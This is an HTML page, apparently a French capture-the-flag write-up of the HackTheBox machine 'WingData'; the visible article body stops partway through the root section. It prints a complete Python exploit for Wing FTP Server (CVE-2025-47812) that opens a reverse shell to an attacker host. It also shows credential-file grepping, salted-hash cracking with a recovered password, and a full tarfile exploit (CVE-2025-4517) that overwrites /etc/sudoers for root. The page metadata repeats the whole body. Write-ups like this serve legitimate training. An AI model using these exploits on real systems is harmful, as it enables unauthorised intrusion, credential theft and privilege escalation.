@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>WingData - HackTheBox Writeup | keyll0ger</title>
+<meta name="keywords" content="HTB, Linux, Easy">
+<meta name="description" content="OS: Debian 12 | Difficulté: Easy | IP: 10.129.244.106
+Phase 1 - Reconnaissance nmap -Pn -p- --min-rate 5000 10.129.244.106 nmap -Pn -sCV -p 22,80 10.129.244.106 Port Service Info 22 SSH OpenSSH 9.2p1 Debian 80 HTTP Apache 2.4.66, redirect → wingdata.htb Ajouter au hosts : 10.129.244.106 wingdata.htb ftp.wingdata.htb
+Le site principal est un site vitrine &ldquo;WingData&rdquo;. Le code source révèle un lien &ldquo;Client Portal&rdquo; vers http://ftp.wingdata.htb/.
+Phase 2 - Wing FTP Server 7.">
+<meta name="author" content="keyll0ger">
+<link rel="canonical" href="https://keyll0ger.github.io/posts/wingdata/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://keyll0ger.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://keyll0ger.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://keyll0ger.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://keyll0ger.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://keyll0ger.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://keyll0ger.github.io/posts/wingdata/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:title" content="WingData - HackTheBox Writeup" />
+<meta property="og:description" content="OS: Debian 12 | Difficulté: Easy | IP: 10.129.244.106
+Phase 1 - Reconnaissance nmap -Pn -p- --min-rate 5000 10.129.244.106 nmap -Pn -sCV -p 22,80 10.129.244.106 Port Service Info 22 SSH OpenSSH 9.2p1 Debian 80 HTTP Apache 2.4.66, redirect → wingdata.htb Ajouter au hosts : 10.129.244.106 wingdata.htb ftp.wingdata.htb
+Le site principal est un site vitrine &ldquo;WingData&rdquo;. Le code source révèle un lien &ldquo;Client Portal&rdquo; vers http://ftp.wingdata.htb/.
+Phase 2 - Wing FTP Server 7." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://keyll0ger.github.io/posts/wingdata/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2026-03-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2026-03-27T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="WingData - HackTheBox Writeup"/>
+<meta name="twitter:description" content="OS: Debian 12 | Difficulté: Easy | IP: 10.129.244.106
+Phase 1 - Reconnaissance nmap -Pn -p- --min-rate 5000 10.129.244.106 nmap -Pn -sCV -p 22,80 10.129.244.106 Port Service Info 22 SSH OpenSSH 9.2p1 Debian 80 HTTP Apache 2.4.66, redirect → wingdata.htb Ajouter au hosts : 10.129.244.106 wingdata.htb ftp.wingdata.htb
+Le site principal est un site vitrine &ldquo;WingData&rdquo;. Le code source révèle un lien &ldquo;Client Portal&rdquo; vers http://ftp.wingdata.htb/.
+Phase 2 - Wing FTP Server 7."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://keyll0ger.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "WingData - HackTheBox Writeup",
+      "item": "https://keyll0ger.github.io/posts/wingdata/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "WingData - HackTheBox Writeup",
+  "name": "WingData - HackTheBox Writeup",
+  "description": "OS: Debian 12 | Difficulté: Easy | IP: 10.129.244.106\nPhase 1 - Reconnaissance nmap -Pn -p- --min-rate 5000 10.129.244.106 nmap -Pn -sCV -p 22,80 10.129.244.106 Port Service Info 22 SSH OpenSSH 9.2p1 Debian 80 HTTP Apache 2.4.66, redirect → wingdata.htb Ajouter au hosts : 10.129.244.106 wingdata.htb ftp.wingdata.htb\nLe site principal est un site vitrine \u0026ldquo;WingData\u0026rdquo;. Le code source révèle un lien \u0026ldquo;Client Portal\u0026rdquo; vers http://ftp.wingdata.htb/.\nPhase 2 - Wing FTP Server 7.",
+  "keywords": [
+    "HTB", "Linux", "Easy"
+  ],
+  "articleBody": " OS: Debian 12 | Difficulté: Easy | IP: 10.129.244.106\nPhase 1 - Reconnaissance nmap -Pn -p- --min-rate 5000 10.129.244.106 nmap -Pn -sCV -p 22,80 10.129.244.106 Port Service Info 22 SSH OpenSSH 9.2p1 Debian 80 HTTP Apache 2.4.66, redirect → wingdata.htb Ajouter au hosts : 10.129.244.106 wingdata.htb ftp.wingdata.htb\nLe site principal est un site vitrine “WingData”. Le code source révèle un lien “Client Portal” vers http://ftp.wingdata.htb/.\nPhase 2 - Wing FTP Server 7.4.3 ftp.wingdata.htb héberge Wing FTP Server v7.4.3 (Free Edition) avec un login web. L’accès anonymous est activé (pas de password requis).\nCVE-2025-47812 - Unauthenticated RCE Wing FTP ≤ 7.4.3 est vulnérable à une injection de code Lua via un NULL byte dans le username. Le serveur écrit les sessions comme des scripts Lua exécutables. Un NULL byte dans le username permet d’injecter du code Lua arbitraire.\nExploit :\n#!/usr/bin/env python3 \"\"\"CVE-2025-47812 - Wing FTP Server RCE\"\"\" import requests, sys TARGET = sys.argv[1] # ftp.wingdata.htb LHOST = sys.argv[2] # attacker IP LPORT = sys.argv[3] # listener port BASE = f\"http://{TARGET}\" LUA_PAYLOAD = f']]os.execute(\"bash -c \\'bash -i \u003e\u0026 /dev/tcp/{LHOST}/{LPORT} 0\u003e\u00261\\'\")--' USERNAME = \"anonymous\\x00\" + LUA_PAYLOAD # Step 1: Login avec injection r = requests.post(f\"{BASE}/loginok.html\", data={\"username\": USERNAME, \"password\": \"\", \"submit_btn\": \" Login \"}, allow_redirects=False) uid = r.cookies.get(\"UID\") # Step 2: Trigger l'exécution Lua requests.get(f\"{BASE}/dir.html\", cookies={\"UID\": uid}) print(f\"[+] Check listener on {LHOST}:{LPORT}\") nc -lvnp 9001 python3 exploit.py ftp.wingdata.htb 10.10.17.198 9001 # → Shell en tant que wingftp Phase 3 - User (wacky) Extraction des hashes Wing FTP stocke les credentials dans des fichiers XML :\ngrep -ri \"password\" /opt/wftpserver/Data/ 2\u003e/dev/null Hashes trouvés dans /opt/wftpserver/Data/1/users/*.xml et la config du domaine révèle le schéma de hashing :\ngrep -i \"salt\\|SHA256\" /opt/wftpserver/Data/1/settings.xml # EnableSHA256: 1 # EnablePasswordSalting: 1 # SaltingString: WingFTP Format : SHA256(password + \"WingFTP\")\nLe code source Lua dans /opt/wftpserver/lua/ServerInterface.lua confirme :\ntemppass = user.password..salt_string password_md5 = sha2(temppass) Crack du hash # hashcat custom avec salt append # Mode 1410 = sha256($pass.$salt) echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' \u003e hash.txt hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt Ou en Python (si hashcat mode 1410 pose problème) :\n# SHA256(password + \"WingFTP\") pour chaque mot de rockyou import hashlib with open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore') as f: for line in f: pw = line.strip() if hashlib.sha256((pw + \"WingFTP\").encode()).hexdigest() == \"32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca\": print(f\"CRACKED: {pw}\") break Résultat : wacky : !#7Blushing^*Bride5\nSSH ssh wacky@10.129.244.106 # password: !#7Blushing^*Bride5 cat ~/user.txt Phase 4 - Root (CVE-2025-4517) Sudo sudo -l # (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py * Le script extrait un tar dans un staging directory avec tarfile.extractall(filter=\"data\").\nPython 3.12.3 est vulnérable à CVE-2025-4517 : os.path.realpath() retourne un résultat tronqué quand la résolution de symlinks dépasse PATH_MAX (4096 bytes). Le filtre data de tarfile utilise realpath() pour vérifier que les fichiers restent dans le répertoire de destination. Si realpath() tronque, la vérification est bypassée.\nExploit CVE-2025-4517 Le PoC crée un tar avec :\n16 symlinks chainés qui se résolvent mutuellement (chaque résolution ajoute ~247 chars) Un symlink final qui dépasse PATH_MAX → realpath() ne le résout plus Un symlink “escape” vers /etc via le chemin non résolu Un hardlink vers escape/sudoers Un fichier régulier qui écrase le hardlink → écrit dans /etc/sudoers import tarfile, os, io comp = 'd' * 247 steps = \"abcdefghijklmnop\" path = \"\" with tarfile.open(\"/opt/backup_clients/backups/backup_9999.tar\", mode=\"w\") as tar: for i in steps: a = tarfile.TarInfo(os.path.join(path, comp)) a.type = tarfile.DIRTYPE tar.addfile(a) b = tarfile.TarInfo(os.path.join(path, i)) b.type = tarfile.SYMTYPE b.linkname = comp tar.addfile(b) path = os.path.join(path, comp) linkpath = os.path.join(\"/\".join(steps), \"l\"*254) l = tarfile.TarInfo(linkpath) l.type = tarfile.SYMTYPE l.linkname = (\"../\" * len(steps)) tar.addfile(l) e = tarfile.TarInfo(\"escape\") e.type = tarfile.SYMTYPE e.linkname = linkpath + \"/../../../../etc\" tar.addfile(e) f = tarfile.TarInfo(\"flaglink\") f.type = tarfile.LNKTYPE f.linkname = \"escape/sudoers\" tar.addfile(f) content = b\"wacky ALL=(ALL) NOPASSWD:ALL\\n\" c = tarfile.TarInfo(\"flaglink\") c.type = tarfile.REGTYPE c.size = len(content) tar.addfile(c, fileobj=io.BytesIO(content)) Exécution python3 poc.py sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_poc # [+] Extraction completed sudo -l # (ALL) NOPASSWD: ALL sudo /bin/bash cat /root/root.txt # c794091a39b1e79e7ac7ca626db009b2 Kill Chain ┌──────────────────────────┐ │ Nmap → SSH + HTTP │ │ wingdata.htb → ftp. │ │ Wing FTP Server 7.4.3 │ └────────────┬─────────────┘ │ CVE-2025-47812 │ NULL byte Lua injection ┌────────────▼─────────────┐ │ Shell wingftp │ │ XML configs → hashes │ │ SHA256(pw + \"WingFTP\") │ └────────────┬─────────────┘ │ Hashcat → wacky:!#7Blushing^*Bride5 ┌────────────▼─────────────┐ │ SSH wacky │ │ sudo restore script │ │ Python 3.12.3 │ └────────────┬─────────────┘ │ CVE-2025-4517 │ tarfile PATH_MAX overflow │ → overwrite /etc/sudoers ┌────────────▼─────────────┐ │ ROOT │ └──────────────────────────┘ Flags Root: c794091a39b1e79e7ac7ca626db009b2 ",
+  "wordCount" : "722",
+  "inLanguage": "en",
+  "datePublished": "2026-03-27T00:00:00Z",
+  "dateModified": "2026-03-27T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "keyll0ger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://keyll0ger.github.io/posts/wingdata/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "keyll0ger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://keyll0ger.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://keyll0ger.github.io/" accesskey="h" title="keyll0ger (Alt + H)">keyll0ger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://keyll0ger.github.io/posts/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://keyll0ger.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://keyll0ger.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      WingData - HackTheBox Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-03-27 00:00:00 +0000 UTC'>March 27, 2026</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;keyll0ger
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#phase-1---reconnaissance" aria-label="Phase 1 - Reconnaissance">Phase 1 - Reconnaissance</a></li>
+                <li>
+                    <a href="#phase-2---wing-ftp-server-743" aria-label="Phase 2 - Wing FTP Server 7.4.3">Phase 2 - Wing FTP Server 7.4.3</a><ul>
+                        
+                <li>
+                    <a href="#cve-2025-47812---unauthenticated-rce" aria-label="CVE-2025-47812 - Unauthenticated RCE">CVE-2025-47812 - Unauthenticated RCE</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-3---user-wacky" aria-label="Phase 3 - User (wacky)">Phase 3 - User (wacky)</a><ul>
+                        
+                <li>
+                    <a href="#extraction-des-hashes" aria-label="Extraction des hashes">Extraction des hashes</a></li>
+                <li>
+                    <a href="#crack-du-hash" aria-label="Crack du hash">Crack du hash</a></li>
+                <li>
+                    <a href="#ssh" aria-label="SSH">SSH</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-4---root-cve-2025-4517" aria-label="Phase 4 - Root (CVE-2025-4517)">Phase 4 - Root (CVE-2025-4517)</a><ul>
+                        
+                <li>
+                    <a href="#sudo" aria-label="Sudo">Sudo</a></li>
+                <li>
+                    <a href="#exploit-cve-2025-4517" aria-label="Exploit CVE-2025-4517">Exploit CVE-2025-4517</a></li>
+                <li>
+                    <a href="#ex%c3%a9cution" aria-label="Exécution">Exécution</a></li></ul>
+                </li>
+                <li>
+                    <a href="#kill-chain" aria-label="Kill Chain">Kill Chain</a></li>
+                <li>
+                    <a href="#flags" aria-label="Flags">Flags</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><blockquote>
+<p><strong>OS:</strong> Debian 12 | <strong>Difficulté:</strong> Easy | <strong>IP:</strong> 10.129.244.106</p>
+</blockquote>
+<hr>
+<h2 id="phase-1---reconnaissance">Phase 1 - Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#phase-1---reconnaissance">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -Pn -p- --min-rate <span style="color:#ae81ff">5000</span> 10.129.244.106
+</span></span><span style="display:flex;"><span>nmap -Pn -sCV -p 22,80 10.129.244.106
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 9.2p1 Debian</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td>Apache 2.4.66, redirect → wingdata.htb</td>
+</tr>
+</tbody>
+</table>
+<p>Ajouter au hosts : <code>10.129.244.106 wingdata.htb ftp.wingdata.htb</code></p>
+<p>Le site principal est un site vitrine &ldquo;WingData&rdquo;. Le code source révèle un lien <strong>&ldquo;Client Portal&rdquo;</strong> vers <code>http://ftp.wingdata.htb/</code>.</p>
+<hr>
+<h2 id="phase-2---wing-ftp-server-743">Phase 2 - Wing FTP Server 7.4.3<a hidden class="anchor" aria-hidden="true" href="#phase-2---wing-ftp-server-743">#</a></h2>
+<p><code>ftp.wingdata.htb</code> héberge <strong>Wing FTP Server v7.4.3</strong> (Free Edition) avec un login web. L&rsquo;accès <strong>anonymous</strong> est activé (pas de password requis).</p>
+<h3 id="cve-2025-47812---unauthenticated-rce">CVE-2025-47812 - Unauthenticated RCE<a hidden class="anchor" aria-hidden="true" href="#cve-2025-47812---unauthenticated-rce">#</a></h3>
+<p>Wing FTP ≤ 7.4.3 est vulnérable à une injection de code Lua via un NULL byte dans le username. Le serveur écrit les sessions comme des scripts Lua exécutables. Un NULL byte dans le username permet d&rsquo;injecter du code Lua arbitraire.</p>
+<p><strong>Exploit :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;CVE-2025-47812 - Wing FTP Server RCE&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TARGET <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]  <span style="color:#75715e"># ftp.wingdata.htb</span>
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]   <span style="color:#75715e"># attacker IP</span>
+</span></span><span style="display:flex;"><span>LPORT <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>]   <span style="color:#75715e"># listener port</span>
+</span></span><span style="display:flex;"><span>BASE <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>TARGET<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LUA_PAYLOAD <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;]]os.execute(&#34;bash -c </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">bash -i &gt;&amp; /dev/tcp/</span><span style="color:#e6db74">{</span>LHOST<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>LPORT<span style="color:#e6db74">}</span><span style="color:#e6db74"> 0&gt;&amp;1</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#34;)--&#39;</span>
+</span></span><span style="display:flex;"><span>USERNAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;anonymous</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> LUA_PAYLOAD
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 1: Login avec injection</span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BASE<span style="color:#e6db74">}</span><span style="color:#e6db74">/loginok.html&#34;</span>,
+</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>: USERNAME, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;submit_btn&#34;</span>: <span style="color:#e6db74">&#34; Login &#34;</span>},
+</span></span><span style="display:flex;"><span>    allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>uid <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;UID&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2: Trigger l&#39;exécution Lua</span>
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BASE<span style="color:#e6db74">}</span><span style="color:#e6db74">/dir.html&#34;</span>, cookies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;UID&#34;</span>: uid})
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Check listener on </span><span style="color:#e6db74">{</span>LHOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>LPORT<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">9001</span>
+</span></span><span style="display:flex;"><span>python3 exploit.py ftp.wingdata.htb 10.10.17.198 <span style="color:#ae81ff">9001</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → Shell en tant que wingftp</span>
+</span></span></code></pre></div><hr>
+<h2 id="phase-3---user-wacky">Phase 3 - User (wacky)<a hidden class="anchor" aria-hidden="true" href="#phase-3---user-wacky">#</a></h2>
+<h3 id="extraction-des-hashes">Extraction des hashes<a hidden class="anchor" aria-hidden="true" href="#extraction-des-hashes">#</a></h3>
+<p>Wing FTP stocke les credentials dans des fichiers XML :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -ri <span style="color:#e6db74">&#34;password&#34;</span> /opt/wftpserver/Data/ 2&gt;/dev/null
+</span></span></code></pre></div><p>Hashes trouvés dans <code>/opt/wftpserver/Data/1/users/*.xml</code> et la config du domaine révèle le schéma de hashing :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -i <span style="color:#e6db74">&#34;salt\|SHA256&#34;</span> /opt/wftpserver/Data/1/settings.xml
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># EnableSHA256: 1</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># EnablePasswordSalting: 1</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># SaltingString: WingFTP</span>
+</span></span></code></pre></div><p><strong>Format : <code>SHA256(password + &quot;WingFTP&quot;)</code></strong></p>
+<p>Le code source Lua dans <code>/opt/wftpserver/lua/ServerInterface.lua</code> confirme :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>temppass <span style="color:#f92672">=</span> user.password<span style="color:#f92672">..</span>salt_string
+</span></span><span style="display:flex;"><span>password_md5 <span style="color:#f92672">=</span> sha2(temppass)
+</span></span></code></pre></div><h3 id="crack-du-hash">Crack du hash<a hidden class="anchor" aria-hidden="true" href="#crack-du-hash">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># hashcat custom avec salt append</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Mode 1410 = sha256($pass.$salt)</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP&#39;</span> &gt; hash.txt
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">1410</span> hash.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>Ou en Python (si hashcat mode 1410 pose problème) :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># SHA256(password + &#34;WingFTP&#34;) pour chaque mot de rockyou</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/usr/share/wordlists/rockyou.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f:
+</span></span><span style="display:flex;"><span>        pw <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hashlib<span style="color:#f92672">.</span>sha256((pw <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;WingFTP&#34;</span>)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&#34;</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;CRACKED: </span><span style="color:#e6db74">{</span>pw<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span></code></pre></div><p><strong>Résultat : <code>wacky : !#7Blushing^*Bride5</code></strong></p>
+<h3 id="ssh">SSH<a hidden class="anchor" aria-hidden="true" href="#ssh">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh wacky@10.129.244.106
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># password: !#7Blushing^*Bride5</span>
+</span></span><span style="display:flex;"><span>cat ~/user.txt
+</span></span></code></pre></div><hr>
+<h2 id="phase-4---root-cve-2025-4517">Phase 4 - Root (CVE-2025-4517)<a hidden class="anchor" aria-hidden="true" href="#phase-4---root-cve-2025-4517">#</a></h2>
+<h3 id="sudo">Sudo<a hidden class="anchor" aria-hidden="true" href="#sudo">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</span>
+</span></span></code></pre></div><p>Le script extrait un tar dans un staging directory avec <code>tarfile.extractall(filter=&quot;data&quot;)</code>.</p>
+<p><strong>Python 3.12.3</strong> est vulnérable à <strong>CVE-2025-4517</strong> : <code>os.path.realpath()</code> retourne un résultat tronqué quand la résolution de symlinks dépasse PATH_MAX (4096 bytes). Le filtre <code>data</code> de tarfile utilise <code>realpath()</code> pour vérifier que les fichiers restent dans le répertoire de destination. Si <code>realpath()</code> tronque, la vérification est bypassée.</p>
+<h3 id="exploit-cve-2025-4517">Exploit CVE-2025-4517<a hidden class="anchor" aria-hidden="true" href="#exploit-cve-2025-4517">#</a></h3>
+<p>Le PoC crée un tar avec :</p>
+<ol>
+<li><strong>16 symlinks chainés</strong> qui se résolvent mutuellement (chaque résolution ajoute ~247 chars)</li>
+<li>Un <strong>symlink final</strong> qui dépasse PATH_MAX → <code>realpath()</code> ne le résout plus</li>
